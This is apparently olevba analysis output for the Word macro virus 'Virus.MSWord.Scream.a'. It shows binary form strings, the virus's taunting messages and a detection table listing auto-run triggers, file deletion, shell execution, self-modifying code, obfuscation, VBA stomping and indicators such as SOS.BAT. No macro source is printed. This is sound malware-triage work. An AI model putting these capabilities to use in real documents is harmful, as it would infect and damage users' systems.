VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9��G7)��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!�8<.�V� ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ד�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����[QuZ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��.�KC!x=U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Wk�^��92
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����d������P��/M`F�U.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2�OtI�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6$}U5s�1G��mB���3N�U8�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�W����*R�{+�!��ލ�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;΄8�ʶ����.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f
Ҹ�0Ӵh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_���Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,NG�{���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��RK�`���߈�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*z�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G]��o��)dZ�fi<ɺ��Jc�]��B��)Xx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ӌ��&�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�}BC�/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v���5���m��Y�R	XE�&�Wb���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�9(����vr�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��Kc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2(\F���e���Nlm����c��D�_x��TGs�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S<�ĕ�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^-�h""
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�n���~ZW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��M��-���u�#�I�K5�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m��f'��p	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yGA���ZpuY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����$l����u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�����h�u�9/P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�ʶf�&���t��Q����k����:0I�U$#]VF<t�d��LdtR`���]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Z1ne}2C��uQ(l��	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_}>����ʍ�jf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t*��BL��zp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Qq'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�9=�˩_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�/�Q=ט_�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q����!��َSpOR�ѿ+�:,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d��5Y2]�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�|bU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�� ��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]h���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{���_P�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�h}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B���~E}I6y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h��T�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}W�ҼYE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�6N빕
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�}5�Q�eG����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sҁ1��l�BW�$��.��٠/['x��[u�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{���W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y\�� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݲ1�}��;�s#H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!6�V�S�0�Ty�S)겶��Y���H�رĞ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʕ���f���M��]��k�]�d�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��n���W#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=v��3k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����M����_�^O)-���[U��uOB��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�1�CT@l����?B/�c�䒾
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(��p|""����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Vous voyez ce signe: c'est votre cauchemar....L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You see this sign: this is your nightmare....
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HaHaHaHa!!!!�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/HA/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Normal Projet'
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar4'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar5'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox3'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/i13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar3'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/i13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox4'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/MVB/i11/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |SOS.BAT             |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

